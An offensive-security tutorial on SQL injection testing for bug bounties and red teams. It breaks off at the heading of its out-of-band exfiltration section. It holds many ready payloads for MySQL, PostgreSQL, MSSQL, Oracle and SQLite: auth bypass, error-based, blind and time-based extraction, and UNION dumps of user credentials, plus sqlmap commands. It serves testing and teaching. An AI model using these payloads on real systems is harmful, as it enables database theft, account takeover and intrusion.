# SQL Injection — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature where user input reaches a **SQL query** — `WHERE`/`SELECT`/`ORDER BY`/`LIMIT`/`GROUP BY`/`HAVING`, `INSERT`/`UPDATE`/`DELETE`, search, login, filters, sort, pagination, bulk/batch endpoints, GraphQL/REST resolvers, report/export builders, and **any sink** that string-builds SQL (raw drivers, ORMs with `raw()`/`literal()`/string-format, stored procedures with dynamic SQL)
**Backends:** **MySQL/MariaDB**, **PostgreSQL**, **Microsoft SQL Server (MSSQL)**, **Oracle**, **SQLite** — all first-class; **NoSQL injection** is a *different* kit (cross-ref §2.6). Kali/WSL for `sqlmap` & tooling
**Companion files in this folder:**
- `SQL_INJECTION_ARSENAL.md` — per-DBMS payloads: detection, UNION, error, blind, time, OOB, auth-bypass, read/write files, RCE, WAF evasion (copy-paste)
- `SQL_INJECTION_CHECKLIST.md` — the testing-order checklist you tick per sink
- `SQL_INJECTION_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (technique-detecting fuzzer, boolean/time blind extractor, sqlmap power cheat-sheet)

> **The flagship injection class.** SQL injection is the one that still ends with a full database dump, **authentication bypass → admin (ATO)**, file read/write, and — on a misconfigured engine — **remote code execution on the DB host**. It is also the class where hunters lose the most money to bad methodology: (a) calling a reflected error "SQLi" without proving the *query* changed, (b) firing a giant payload list at the WAF instead of first nailing the **context** (string vs numeric vs identifier) and the **DBMS**, (c) seeing a 500 and walking away instead of switching to **boolean/time blind**, and (d) over-proving — dumping a real `users` table when `version()` + a single row of a benign table is already a Critical. Read Part II (detect the five technique families in order) and Part III (escalate to RCE/ATO/dump) — that's where "an error on a quote" becomes a confirmed Critical.

---

> ### ⚡ READ THIS FIRST — why SQL injection pays
> 1. **The ceiling is RCE / total compromise — far above most web bugs.** A single injectable parameter can become: dump the entire DB, **log in as admin** (auth bypass), **read files** off the server, **write a webshell**, and on MSSQL/PostgreSQL/MySQL with the right privileges **execute OS commands** (`xp_cmdshell` / `COPY … FROM PROGRAM` / UDF). That is why it is the perennial top-of-OWASP, top-of-bounty class.
> 2. **Context first, payloads second.** Your input lands in a **string** (`'…'`), a **number** (`id=1`), an **identifier** (`ORDER BY col`), or a keyword slot (`LIMIT`, `LIKE`). The break-out differs. Determine the context (§5) *before* spraying — a payload that works in a string context does nothing in a numeric one and vice-versa.
> 3. **Fingerprint the DBMS early — every technique is dialect-specific.** `version()` vs `@@version` vs `banner`; `||` vs `CONCAT`; `SLEEP()` vs `pg_sleep()` vs `WAITFOR DELAY` vs `dbms_pipe.receive_message`. Get the engine right (§6) and every later payload becomes copy-paste from the arsenal.
> 4. **Most modern SQLi is BLIND.** Apps hide errors and don't reflect data. But the response still **differs** true-vs-false (boolean) or you can make it **wait** (time). That inferential oracle reads the whole database one bit/char at a time (§7/§8) — slower, equally Critical.
> 5. **A WAF/ORM is not the end.** Inline comments, case/whitespace tricks, encoding, `UNION`→`/*!UNION*/`, splitting keywords, scientific notation, and **second-order** (your input is *stored*, then later concatenated by a trusted job, §18) route around naive filters and parameterized front-ends.
>
> **Where the money is (memorize this order):** ① **RCE on the DB host (xp_cmdshell / UDF / COPY FROM PROGRAM) — Critical** → ② **auth bypass → log in as admin (ATO) — Critical** → ③ **full DB dump incl. password hashes / PII / secrets — High–Critical** → ④ **file read (creds, source, `/etc/passwd`) — High** → ⑤ **blind read of sensitive data — High** → ⑥ *then* "a quote threw a 500" / "ORDER BY 10 errored" as a **lead**, not a finding.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [SQL-Injection Anatomy — Contexts, Clauses, the Five Technique Families & Why DBMS Matters](#2-sql-injection-anatomy)
3. [Reconnaissance — Find Every SQL Sink](#3-reconnaissance--find-every-sql-sink)
4. [Baseline — Detect & Classify (error / boolean / time / union / OOB; string vs numeric; DBMS)](#4-baseline--detect--classify)

**PART II — DETECTION (work in this order)**
5. [Context Probing & Breaking the Query](#5-context-probing--breaking-the-query)
6. [Error-Based Detection & DBMS Fingerprinting](#6-error-based-detection--dbms-fingerprinting)
7. [Boolean-Based Blind Detection](#7-boolean-based-blind-detection)
8. [Time-Based Blind Detection](#8-time-based-blind-detection)
9. [UNION-Based Detection (column count + injectable columns)](#9-union-based-detection)
10. [Out-of-Band (OOB) Detection & Exfiltration](#10-out-of-band-oob-detection--exfiltration)
11. [Stacked Queries](#11-stacked-queries)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
12. [Authentication Bypass](#12-authentication-bypass)
13. [Data Extraction — Schema → Dump (UNION + blind)](#13-data-extraction--schema--dump)
14. [Reading Files from the Server](#14-reading-files-from-the-server)
15. [Writing Files → Webshell](#15-writing-files--webshell)
16. [Remote Code Execution per DBMS](#16-remote-code-execution-per-dbms)
17. [Privilege Escalation & Lateral Movement](#17-privilege-escalation--lateral-movement)
18. [Second-Order SQL Injection](#18-second-order-sql-injection)
19. [WAF / Filter / ORM Evasion](#19-waf--filter--orm-evasion)
20. [DBMS-Specific Deep Dives (MySQL · PostgreSQL · MSSQL · Oracle · SQLite)](#20-dbms-specific-deep-dives)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
21. [The Validity-First Mindset](#21-the-validity-first-mindset)
22. [False Positives — STOP reporting these](#22-false-positives--stop-reporting-these-auto-reject-list)
23. [Severity Calibration](#23-severity-calibration--how-triagers-really-rate-sqli)
24. [Impact-Escalation Playbooks — "you found X, now do Y"](#24-impact-escalation-playbooks--you-found-x-now-do-y)
25. [Building a Professional, Safe PoC](#25-building-a-professional-safe-poc)
26. [Reporting, CWE/CVSS & De-duplication](#26-reporting-cwecvss--de-duplication)
27. [Automation (sqlmap) & Red-Team Notes](#27-automation-sqlmap--red-team-notes)

**Appendices**
- [Appendix A — SQLi Workflow Cheat Sheet](#appendix-a--sqli-workflow-cheat-sheet)
- [Appendix B — SQLi Decision Tree](#appendix-b--sqli-decision-tree)
- [Appendix C — Per-DBMS Syntax & Function Reference](#appendix-c--per-dbms-syntax--function-reference)
- [Appendix D — Important Links](#appendix-d--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–27) are reference detail; this is the order you execute.

```
PHASE 0  RECON           → find every parameter that reaches SQL (URL/body/JSON/headers/cookies); map login, search,
                            sort/ORDER BY, filter, pagination, export, GraphQL/REST resolvers (§3/§1)
PHASE 1  BASELINE  ★      → send a normal value, then ' and " and ) ; classify: error / boolean-diff / time / union-able /
                            silent. Decide STRING vs NUMERIC vs IDENTIFIER context. Note any DBMS hints (§4)
PHASE 2  DETECT           → break the query & confirm context (§5) → error-based + DBMS fingerprint (§6) →
                            boolean blind (§7) → time blind (§8) → UNION (column count + type, §9) →
                            OOB if firewalled-blind (§10) → stacked queries (§11)
PHASE 3  IMPACT  ⭐ (money)→ auth bypass (§12) · schema→dump (§13) · file read (§14) · file write→shell (§15) ·
                            RCE per DBMS (§16) · DB privesc / linked-server lateral (§17) · second-order (§18)
PHASE 4  EVADE (if WAF)   → comments/case/whitespace · encoding/double-encoding · keyword split · /*!…*/ · time over
                            boolean · second-order route-around (§19)
PHASE 5  VALIDATE→REPORT  → validity (§21) · false-positive filter (§22) · severity+CVSS+CWE-89 (§23) ·
                            SAFE PoC: version()+1 benign row, no mass dump, no writes on prod (§25) · dedup (§26) · template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Enumerate **every** input that can reach SQL (§3): every URL/POST param, JSON field, cookie, and the headers apps log into SQL (`User-Agent`, `Referer`, `X-Forwarded-For`). Prioritize login, search, sort/`ORDER BY`, filters, pagination, and report/export. *Deliverable:* a list of candidate sinks.
2. **PHASE 1 — Baseline ★.** For each sink: a normal value, then `'`, `"`, `)`, and the arithmetic test (`1` vs `2-1`). Classify the observable (**error / boolean-diff / time / union-able / silent**) and the **context** (string/numeric/identifier) (§4/§5). *Deliverable:* a sink classified by observability + context.
3. **PHASE 2 — Detect.** Break the query and confirm context (§5), read errors + **fingerprint the DBMS** (§6), then work the technique families in order: **boolean** (§7) → **time** (§8) → **UNION** (§9) → **OOB** (§10) → **stacked** (§11). *Deliverable:* confirmed injection + technique + DBMS.
4. **PHASE 3 — Impact ⭐.** Escalate to the highest the engine/privs allow: **RCE** (§16), **auth bypass** (§12), **dump** (§13), **file read/write** (§14/§15), **DB privesc/lateral** (§17), **second-order** (§18). *Deliverable:* one demonstrated, safe, high-impact PoC.
5. **PHASE 4 — Evade.** If a WAF/ORM blocks payloads, route around it (comments, case, encoding, keyword-split, time-over-boolean, second-order) (§19). *Deliverable:* a payload that injects despite the filter.
6. **PHASE 5 — Validate → report.** Apply validity & FP filters (§21/§22), set CVSS/CWE-89 (§23), build a *safe* PoC (`version()` + one benign row, no mass dump) (§25), de-dup, write it (§26). *Deliverable:* the submitted report.

Reference anytime: payloads → `SQL_INJECTION_ARSENAL.md`; checklist → `SQL_INJECTION_CHECKLIST.md`; scripts → `poc/`; playbooks **§24**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder/Comparer) | the core tool — tamper a param, replay, diff responses (Comparer for boolean blind), Intruder for column-count/charset sweeps |
| **`poc/sqli_fuzz.py`** | spray context-breakers + per-technique probes (error / boolean / time / union) against one `FUZZ` point; classify the technique & guess the DBMS |
| **`poc/sqli_blind.py`** | boolean **and** time blind extractor — read a value char-by-char (binary search) through a true/false or delay oracle |
| **`sqlmap`** | the industry exploiter — confirm, fingerprint, dump, `--os-shell`, `--file-read/--file-write`. *Verify findings by hand first;* see `poc/sqlmap_cheat.md` |
| **`ghauri`** | fast alternative engine for stubborn blind/time cases (good when sqlmap stalls) |
| **OOB infra** | Burp Collaborator / your own DNS-logger for out-of-band exfil when blind & firewalled (§10) |
| **ffuf / Intruder** | fuzz the breaker set across many params; brute column counts; charset sweeps for blind |
| **nuclei** (`-tags sqli`) | first-pass candidate discovery (always verify by hand) |

```bash
# Kali/WSL
python3 poc/sqli_fuzz.py -u "https://target/item?id=FUZZ"                 # technique + DBMS guess
python3 poc/sqli_blind.py -u "https://target/item?id=1" --inject id \
    --true "in stock" --dbms mysql --extract "select @@version"           # boolean/time char-by-char
sqlmap -u "https://target/item?id=1" --batch --risk=2 --level=3          # confirm/dump (see poc/sqlmap_cheat.md)
```
> **Manual-first, sqlmap-second.** sqlmap is the best exploiter on earth, but triagers reject "sqlmap said so" with no hand proof, and a blind `--level 5 --risk 3` run is **loud and can corrupt data** (it tries stacked writes). Confirm the bug yourself (context + a controlled true/false or a clean `version()`), *then* let sqlmap do the grinding under tight flags (§27).

> **Windows:** drive Burp on Windows; run the Python `poc/` helpers, `sqlmap`, and `ghauri` in **WSL/Kali**. Keep an OOB endpoint (Collaborator) ready before you start — you don't want to discover the only channel is OOB and have no listener.

---

# 2. SQL-Injection Anatomy

## 2.1 What it is
User input is incorporated into a SQL statement **as code, not data** — the app string-builds the query instead of using a **parameterized query / prepared statement**. By injecting SQL syntax you change *what the query does*: read other rows/tables (dump), make a condition always-true (auth bypass / boolean oracle), call DBMS functions (read files, sleep, run OS commands), or append extra statements (stacked queries → write/RCE). It is **CWE-89**, the canonical member of the injection family (**CWE-74**).

## 2.2 The query clauses your input can land in (each behaves differently)
```
WHERE      …WHERE id = $x            most common; boolean/union/time all apply
SELECT     SELECT $col FROM…         column-name/identifier context (no quotes) — see ORDER BY
FROM       …FROM $table              table-name/identifier context
ORDER BY   …ORDER BY $col [ASC]      IDENTIFIER context: can't quote-break; use column-index, CASE, or (SELECT…) tricks (§5.4)
LIMIT      …LIMIT $n                  numeric/keyword slot (MySQL: after LIMIT you can add PROCEDURE ANALYSE / INTO)
GROUP BY / HAVING                     identifier/boolean context
INSERT     INSERT INTO t VALUES($a,$b)   error-based & sub-select inside VALUES; second-order source
UPDATE     UPDATE t SET col=$x WHERE… changing other columns / sub-select; can corrupt data — careful (§25)
DELETE     DELETE FROM t WHERE $x     DANGEROUS to exploit live — prove read-only on a clone/own row (§25)
```

## 2.3 The injection CONTEXT (decide your break-out — §5)
```
STRING     …name = 'INPUT'           break with a single quote ' (or " on MySQL).  Close-string then comment: ' OR '1'='1
NUMERIC    …id = INPUT               no quotes to close.  Inject directly: 1 OR 1=1  /  1 AND 1=2  /  1-SLEEP(0)
IDENTIFIER …ORDER BY INPUT           can't use quotes; the value names a column → use index / CASE / boolean (§5.4)
LIKE       …name LIKE 'INPUT%'       string context but inside LIKE; watch %/_ and the trailing %
QUOTED-NUM '…' wrapping a number      sometimes numeric data is quoted; treat as string context
```

## 2.4 The FIVE technique families (decide detection — Part II)
```
1. ERROR-BASED   the DB error is shown → extract data INSIDE the error (extractvalue/updatexml/cast).      §6
2. UNION-BASED   append UNION SELECT to pull other tables into the visible result set (data is reflected).  §9
3. BOOLEAN BLIND no data/no error, but TRUE vs FALSE conditions give different responses → infer bit by bit. §7
4. TIME BLIND    no observable difference at all, but you can make the DB SLEEP on a condition → infer by delay. §8
5. OUT-OF-BAND   no in-band channel; force the DB to make a DNS/HTTP request that carries the data to you.    §10
(+ STACKED QUERIES: append ; <second statement> → INSERT/UPDATE/exec — driver-dependent.)                    §11
```
Pick the **most reliable observable** the target gives you, in roughly this order of convenience: in-band (error/UNION) > boolean > time > OOB. You only need **one** to win.

## 2.5 Why DBMS matters (the same bug, five dialects)
The injection point is identical; the *exploitation* is dialect-specific. Get the engine right (§6) and the arsenal is copy-paste.
```
                 MySQL/MariaDB     PostgreSQL        MSSQL              Oracle               SQLite
version          @@version         version()         @@version          banner (v$version)   sqlite_version()
string concat    CONCAT(a,b)       a||b              a+b                a||b                  a||b
comment          -- - / # / /**/   -- / /**/         -- / /**/          -- / /**/            -- / /**/
sleep            SLEEP(5)          pg_sleep(5)        WAITFOR DELAY '0:0:5'  dbms_pipe.receive_message(('a'),5)  (none native)
stacked queries  usually NO (mysqli) YES (libpq)      YES               limited              via some drivers
substring        SUBSTRING/MID     SUBSTRING          SUBSTRING          SUBSTR               SUBSTR
metadata         information_schema information_schema information_schema / sys  all_tables/user_tables  sqlite_master
file read        LOAD_FILE()       pg_read_file / COPY  OPENROWSET BULK    UTL_FILE             (none)
OS command       UDF (sys_exec)    COPY…FROM PROGRAM  xp_cmdshell        DBMS_SCHEDULER/Java   (none)
```

## 2.6 What SQL injection is **not** (route to the right kit)
- **NoSQL injection** (MongoDB `$ne`/`$gt`, operator injection, JS `$where`) — a *different* class; same "untrusted input in a query" idea, different syntax. Own kit (likely-next). Don't force SQL payloads at a Mongo backend.
- **ORM injection** is still SQLi when the ORM lets a string reach raw SQL (`.raw()`, `.extra()`, `String.format` into a query, `.order(params[:sort])`). Parameterized ORM use is safe; the bug is the *string-built* escape hatch.
- **Command injection / SSTI / LDAP / XPath** — sibling injection classes, separate kits. A `;id;` that runs is **command** injection, `${7*7}`→`49` is **SSTI**, `*)(uid=*` is **LDAP**.

> **The mental model:** SQL injection means **you are co-authoring the query.** Decide *where* your text lands (the context), *which engine* parses it (the DBMS), and *which channel* shows you the answer (error/union/boolean/time/OOB). Get those three right and every payload in the arsenal becomes mechanical.

---

# 3. Reconnaissance — Find Every SQL Sink

```
□ Obvious params:   ?id=  ?user=  ?page=  ?category=  ?search=  ?sort=  ?order=  ?filter=  ?lang=  ?date=
□ Login / auth:     username/password/email fields, "forgot password" lookups, API token/login endpoints.
□ Sort & paginate:  ?sort=col / ?order=asc / ORDER BY-backed columns / ?limit= / ?offset=  (IDENTIFIER context — §5.4).
□ Search & filter:  free-text search, faceted filters, "advanced search", date ranges, price/min/max.
□ Body & JSON:      POST form fields, JSON keys (incl. nested), GraphQL args/variables, REST path & query, XML.
□ Headers apps LOG: User-Agent, Referer, X-Forwarded-For, X-Real-IP, Cookie — analytics/audit code often INSERTs these raw.
□ Cookies / hidden: session sub-fields, "remember me" tokens, hidden form values used in lookups.
□ Mass/bulk:        export/report builders, CSV/PDF generators, "download my data", admin search, bulk-action id lists.
□ Source/JS recon:  grep client JS & any source for query string-building (see code sinks below).
□ Second-order:     anything STORED then later used in a query — profile name, address, filename, comment (§18).
```
**Code sinks (grep source/JS — these are where it lives):**
```
PHP    mysqli_query("...$x...")  / $pdo->query("...$x")  / pg_query  / "...".$_GET[...]   (NOT prepare()+bind)
Java   Statement.executeQuery("..."+x)  / createQuery("..."+x) (JPQL)  / String.format into SQL   (NOT PreparedStatement)
.NET   new SqlCommand("..."+x)  / string interpolation $"...{x}..."   (NOT parameters.Add)
Py     cursor.execute("..."+x)  / .execute(f"...{x}...")  / .raw("..."+x)  / sa.text("..."+x)   (NOT execute(sql,(x,)))
Node   db.query("..."+x)  / `SELECT ... ${x}`  / knex.raw("..."+x)  / sequelize.literal(x)       (NOT $1 placeholders)
Ruby   where("name = '#{x}'")  / order(params[:sort])  / find_by_sql("..."+x)                    (NOT where(name: x))
Go     db.Query("..."+x)  / fmt.Sprintf into SQL                                                  (NOT db.Query(sql, x))
```
> **If this → then that:** a **`?sort=`/`?order=` / column name** parameter → **identifier context** (you can't quote-break) → go straight to the `ORDER BY` techniques (§5.4) — column index, `CASE`, `(SELECT … )`. A **login** → auth-bypass probing (§12). A **numeric `?id=`** → arithmetic test first (`2-1` returns the same row → injectable, §4). A **header logged into an audit table** → second-order INSERT (§18), often missed and unauthenticated.

---

# 4. Baseline — Detect & Classify

**Do this before deep payloads.** Establish observability, context, and DBMS.

## 4.1 Quick classification probes (send each ALONE, compare to a normal value)
```
Normal value:    id=1                       → baseline: status, length, body, timing.
Single quote:    id=1'                       → SQL error / 500 / different page? → ERROR or break (string context). (§6)
Double quote:    id=1"                        → some string contexts use " (esp. MySQL) — try both.
Closing paren:   id=1)   id=1')              → function/paren-wrapped value; error tells you the wrapper.
Arithmetic:      id=2-1   vs   id=1           → SAME row as id=1? → NUMERIC context & injectable (math evaluated). (§5.2)
Boolean true:    id=1 OR 1=1     /  ' OR '1'='1   → MORE/same rows (true)…
Boolean false:   id=1 AND 1=2    /  ' AND '1'='2  → …FEWER/no rows (false). Different ⇒ BOOLEAN oracle. (§7)
Time true:       id=1 AND SLEEP(5)   (string: ' AND SLEEP(5)-- -) → response delayed ~5s? → TIME blind & MySQL. (§8)
Comment swallow: id=1'-- -    id=1'#          → does the rest of the query get commented out cleanly? (context confirm)
String concat:   id='a'||'b' (PG/Oracle/SQLite)  vs  'a' 'b' (MySQL)  → which concat works hints the DBMS. (§6)
```

## 4.2 Determine the context (string vs numeric vs identifier)
```
□ NUMERIC  : id=2-1 returns the id=1 row (math ran) AND id=1' may NOT error → no quotes wrap your input.
□ STRING   : id=1' errors but id=1'-- - (or ' OR '1'='1) fixes it → your input is inside '…'. Confirm with ' AND '1'='1 (true) vs '1'='2 (false).
□ IDENTIFIER (ORDER BY / column / table): quotes don't help; the value names a column. Test with column INDEX
            (?sort=1 vs ?sort=2 reorder differently) and CASE/boolean (§5.4).
□ LIKE     : trailing % matters — ' OR 1=1-- - inside LIKE '…%' needs to account for the appended %.
```

## 4.3 Note what you'll need next
- **DBMS** (MySQL/PostgreSQL/MSSQL/Oracle/SQLite) → functions, comments, sleep, file/RCE primitives (§6/§20).
- **Observability** → error (§6) · UNION-able/reflected (§9) · boolean (§7) · time (§8) · OOB-only (§10).
- **Context** → string/numeric/identifier → break-out (§5).
- **Stacked?** → does the driver allow `;`-separated statements (PG/MSSQL yes; mysqli usually no) (§11).
- **Filtering?** → which keywords/chars are blocked → plan evasion (§19).

> **Don't conclude "not vulnerable" from "my quote didn't error."** Errors are often suppressed. The decisive tests are **boolean** (`AND 1=1` vs `AND 1=2` give *different* pages) and **time** (`AND SLEEP(5)` delays the response). Numeric injection frequently throws **no error at all** — the arithmetic test (`2-1`→`id=1` row) is what reveals it. Silence ≠ safe; it usually means **blind** (§7/§8).

---

# PART II — DETECTION (work in this order)

> Full payload lists are in `SQL_INJECTION_ARSENAL.md`. Confirm the **context** (§5) before picking a family.

# 5. Context Probing & Breaking the Query

The whole game is closing whatever wraps your input, injecting, then neutralizing the trailing SQL (comment it out or balance it).

## 5.1 String context
```
Break:    name = 'INPUT'          →  INPUT = '         → 'syntax error near …'  (confirms string + error visible)
Fix tail: '-- -   '#   '/*        →  ' OR '1'='1'-- -  (-- - needs a trailing space; # is MySQL; /* opens a comment)
Prove:    ' OR '1'='1   (TRUE, widens)     ' AND '1'='2   (FALSE, empties)     ' AND '1'='1   (TRUE, same)
Balance:  if -- doesn't work, BALANCE quotes:  ' OR '1'='1  leaves the closing ' intact (no comment needed).
```

## 5.2 Numeric context
```
Confirm:  id=2-1   → returns the id=1 row (arithmetic evaluated server-side) = numeric injection.
Inject:   id=1 OR 1=1   (true, may dump all)     id=1 AND 1=2   (false, empties)     id=0 UNION SELECT …  (§9)
Time/bool work directly:  1 AND SLEEP(5)   /  1 AND (SELECT 1 FROM …)=1
```

## 5.3 Quote/paren wrapper discovery
```
id=1'         → error                          (string, single-quote wrapper)
id=1')        → error fixed with )             (value inside a function/paren:  func('1') )
id=1'))-- -   → close two parens               (nested wrappers)
# Watch the error: it usually echoes the broken fragment, revealing exactly how many quotes/parens to close.
```

## 5.4 IDENTIFIER context (`ORDER BY` / column / table name) — no quotes possible
You can't break a string because there isn't one. Three reliable routes:
```
COLUMN INDEX :  ?sort=1  vs  ?sort=2          → different ordering = injectable identifier; brute index to find column count.
BOOLEAN via ORDER BY a CASE :
   ?sort=(CASE WHEN (1=1) THEN name ELSE id END)        → ordering A
   ?sort=(CASE WHEN (1=2) THEN name ELSE id END)        → ordering B   ⇒ boolean oracle without quotes
TIME via subquery (MySQL) :
   ?sort=(SELECT 1 FROM (SELECT SLEEP(5))x)             → response delays ⇒ confirmed
DIRECTION slot :  ?order=ASC→ try  ?order=ASC,(SELECT …)  or  ?order=ASC-- -
```
> **If this → then that:** the param is `ORDER BY`/`GROUP BY`/a column or table name → **identifier context** → quote payloads do nothing; pivot immediately to **index probing**, a **`CASE` boolean**, or a **subquery `SLEEP`** (§5.4). This is the single most-missed SQLi — hunters try `'` , get nothing, and leave. Many ORMs that parameterize *values* still concatenate the **sort column** raw.

---

# 6. Error-Based Detection & DBMS Fingerprinting

A visible DB error confirms injection *and* fingerprints the engine — and on many engines you can force data *into* the error message (error-based extraction).

## 6.1 Fingerprint from the error text / behavior
```
MySQL/MariaDB:  "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"
                version: SELECT @@version / VERSION()   ·  string concat needs CONCAT()  ·  comments -- - / # / /*!*/
PostgreSQL:     "ERROR: unterminated quoted string" / "syntax error at or near"  ·  version()  ·  concat ||  ·  ::cast
MSSQL:          "Unclosed quotation mark after the character string" / "Conversion failed when converting the varchar…"
                @@version  ·  concat +  ·  WAITFOR DELAY  ·  error-based via CONVERT/CAST type mismatch
Oracle:         "ORA-01756: quoted string not properly terminated" / "ORA-00933"  ·  banner from v$version  ·  dual table
SQLite:         "unrecognized token" / "SQL logic error"  ·  sqlite_version()  ·  sqlite_master metadata
```

## 6.2 Error-based data extraction (when errors are shown)
```
MySQL (extractvalue / updatexml — embeds output in the XPATH error, ~32 chars/shot):
  ' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -
  ' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
  # double-query / floor() also works: ' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
PostgreSQL (cast text→int forces it into the error):
  ' AND 1=CAST((SELECT version()) AS int)-- -
  ' AND 1=(SELECT 1 FROM (SELECT CAST((SELECT string_agg(usename,',') FROM pg_user) AS int))x)-- -
MSSQL (conversion error leaks the value):
  ' AND 1=CONVERT(int,(SELECT @@version))-- -
  '; SELECT 1/0 FROM (SELECT name FROM sysobjects)x-- -          (force a divide/convert error carrying data)
Oracle (ORA error carrying value):
  ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
  ' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
```
> **If this → then that:** an injected `'` returns a **DB error naming the engine** → you have error-based injection **and** the DBMS. Try the matching error-extraction payload to pull `version()`/`user()` *inside the error* — that single string is clean, decisive PoC proof. If errors are **suppressed** (generic 500/blank), don't stop — move to **boolean** (§7) then **time** (§8). Capture the raw error verbatim for the report.

---

# 7. Boolean-Based Blind Detection

No data and no error, but a **true** condition and a **false** condition produce **different responses** (length, status, a present/absent string, a redirect, "in stock" vs "out of stock"). That difference is a 1-bit oracle — read the database one bit at a time.

## 7.1 Build the oracle
```
Numeric:  id=1 AND 1=1   → TRUE  page (normal row shows)        id=1 AND 1=2   → FALSE page (row gone / different)
String:   ' AND '1'='1   → TRUE                                  ' AND '1'='2   → FALSE
Confirm the difference is STABLE and tied to true/false (repeat to exclude caching/jitter).
```

## 7.2 Extract through the oracle (substring + comparison)
```
LENGTH first:  ' AND (SELECT LENGTH(@@version))=10-- -          (binary-search the length)
CHAR by CHAR:  ' AND SUBSTRING(@@version,1,1)='8'-- -            (or ASCII(SUBSTRING(...))>78 for binary search)
DBMS substring: MySQL/MSSQL SUBSTRING() · Oracle/PG/SQLite SUBSTR() · MySQL also MID()
BINARY SEARCH each char with ASCII()/UNICODE() and > to cut to ~7 requests/char:
  ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77-- -
```
`poc/sqli_blind.py` automates this (binary search, both boolean and time modes). **Prove with a benign target** (`@@version`, `database()`, current user) before touching any real data table (§25).

> **If this → then that:** `AND 1=1` and `AND 1=2` (or the string variants) give **reliably different** responses → **confirmed boolean-blind SQLi**. Prove it by extracting a short benign value (`SELECT @@version` first char, or the DB name length) — you do **not** need to dump `users` to prove the bug. If true/false look identical, the data path may not branch on the row — switch to **time-based** (§8), which needs no visible difference at all.

---

# 8. Time-Based Blind Detection

When even boolean gives no visible difference (fully blind), make the DB **pause** on a condition and read the answer from the **response time**. The slowest but most universal channel — it works whenever the query runs at all.

## 8.1 The sleep primitive per DBMS
```
MySQL:       ' AND SLEEP(5)-- -            1 AND SLEEP(5)            ' OR IF(1=1,SLEEP(5),0)-- -
PostgreSQL:  '; SELECT pg_sleep(5)-- -      ' AND (SELECT 1 FROM pg_sleep(5))::text=''-- -   or  ' AND 1=(CASE WHEN(1=1) THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)-- -
MSSQL:       '; WAITFOR DELAY '0:0:5'-- -   ' IF(1=1) WAITFOR DELAY '0:0:5'-- -
Oracle:      ' AND 1=(CASE WHEN(1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END)-- -   (or DBMS_LOCK.SLEEP if granted)
SQLite:      (no sleep) → use a heavy computation:  AND 1=likelihood(...) / randomblob(1000000000) hashing — unreliable; prefer boolean/OOB.
```

## 8.2 Conditional sleep → read data
```
CONDITION SLEEP:  ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(5),0)-- -    (MySQL)
                  → delayed ⇒ the char's ASCII > 100; binary-search each char.
CONFIRM not noise: run the SAME payload with SLEEP(0) and SLEEP(5) a few times; only the 5s variant should delay,
                   and it should delay CONSISTENTLY. Tune the delay up if the network is jittery.
```
> **If this → then that:** `AND SLEEP(5)` (or the per-DBMS equivalent) makes the response take ~5s while `SLEEP(0)` returns fast, **repeatably** → **confirmed time-blind SQLi**. This also **fingerprints the DBMS** (only MySQL has `SLEEP`, only PG has `pg_sleep`, only MSSQL has `WAITFOR`). Time-blind is slow — pace it and prefer boolean/UNION if available; but it's the channel that works when nothing else does (§25 for safe, bounded extraction).

---

# 9. UNION-Based Detection

When the query's results are **reflected** in the page, `UNION SELECT` appends rows from *any* table into that visible output — the fastest, cleanest dump. Two prerequisites: match the **column count** and find a column of a **compatible (string) type**.

## 9.1 Find the column count
```
ORDER BY climb:   ' ORDER BY 1-- -   ' ORDER BY 2-- -   …   ' ORDER BY N-- -   → first N that ERRORS ⇒ count = N-1.
UNION NULLs:      ' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -   …   → first count that returns WITHOUT a type/count error.
                  (NULL is type-agnostic, so it isolates the column COUNT from the type problem.)
```

## 9.2 Find which column is visible & string-typed
```
Place a marker:   ' UNION SELECT 'a',NULL,NULL-- -   then 'NULL,'a',NULL-- - …  → which position shows 'a' on the page?
                  That column is your output slot. Numeric-only columns reject strings → use the string-typed one.
Oracle needs FROM: ' UNION SELECT 'a',NULL FROM dual-- -    (Oracle SELECT must have a FROM)
```

## 9.3 Pull data through the visible column
```
Concatenate many values into the one visible column:
  MySQL:    ' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users-- -
  PG/Oracle/SQLite: ' UNION SELECT user||':'||password,NULL FROM users-- -
  MSSQL:    ' UNION SELECT user+':'+password,NULL FROM users-- -
Version/user in one shot:
  ' UNION SELECT @@version,NULL-- -    (MySQL/MSSQL)     ' UNION SELECT version(),NULL-- - (PG)
Schema walk (see §13):  information_schema.tables / .columns  (MySQL/PG/MSSQL),  all_tables/all_tab_columns (Oracle),
                        sqlite_master (SQLite).
```
> **If this → then that:** `ORDER BY N` errors at some N (column count) and a `UNION SELECT 'a',NULL,…` shows your marker `a` on the page → **UNION injection with a visible output column**. From here it's a *fast full read*: enumerate schema (§13) and pull tables. For the PoC, pull **`version()` + one benign row** — not the whole `users` table (§25). If column types are strict (numeric columns), put your data in the **string-typed** column and `NULL` the rest.

---

# 10. Out-of-Band (OOB) Detection & Exfiltration

